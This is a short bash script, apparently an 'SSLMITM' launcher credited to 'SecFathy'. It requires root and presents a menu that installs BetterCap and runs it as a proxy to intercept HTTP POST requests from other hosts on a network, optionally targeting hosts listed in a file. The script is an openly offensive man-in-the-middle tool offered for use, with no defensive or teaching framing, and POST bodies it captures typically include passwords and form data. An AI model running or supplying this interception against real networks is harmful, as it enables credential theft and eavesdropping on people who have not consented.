#!/bin/bash
#!Developed By SecFathy
#---------------------------------------------------------------------------#
#                        ROOT Check
#---------------------------------------------------------------------------#

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root"
   exit 1
fi
echo ""

#---------------------------------------------------------------------------#

echo '''
███████╗███████╗██╗     ███╗   ███╗██╗████████╗███╗   ███╗
██╔════╝██╔════╝██║     ████╗ ████║██║╚══██╔══╝████╗ ████║
███████╗███████╗██║     ██╔████╔██║██║   ██║   ██╔████╔██║
╚════██║╚════██║██║     ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
███████║███████║███████╗██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝

'''
#---------------------------------------------------------------------------#

menu1='Please enter your choice: '
options=("Install BetterCap On Linux" "Intercept Post Method Requestes" "Intercept From List Files" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Install BetterCap On Linux")
            apt-get install bettercap
            ;;
        "Intercept Post Method Requestes")
            bettercap --proxy -P POST
            ;;
        "Intercept From List Files")
            bettercap -T list.txt --proxy -P POST
            ;;
        "Quit")
            break
            ;;
        *) echo invalid option;;
    esac
done
